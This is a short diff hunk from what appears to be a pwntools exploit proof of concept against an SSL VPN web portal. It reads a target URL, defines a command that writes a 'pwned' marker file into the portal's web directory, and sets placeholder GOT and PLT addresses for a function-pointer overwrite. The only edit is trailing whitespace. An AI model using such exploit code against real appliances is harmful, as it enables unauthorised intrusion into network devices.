@@ -5,7 +5,7 @@ from pwn import *
 
 # Prompt the user for the URL
 url = input("Enter the URL: ")
-cmd = "echo pwned > /var/appweb/sslvpndocs/hacked.txt"
+cmd = "echo pwned > /var/appweb/sslvpndocs/hacked.txt" 
 
 strlen_GOT = 0x667788  # change me
 system_plt = 0x445566  # change me
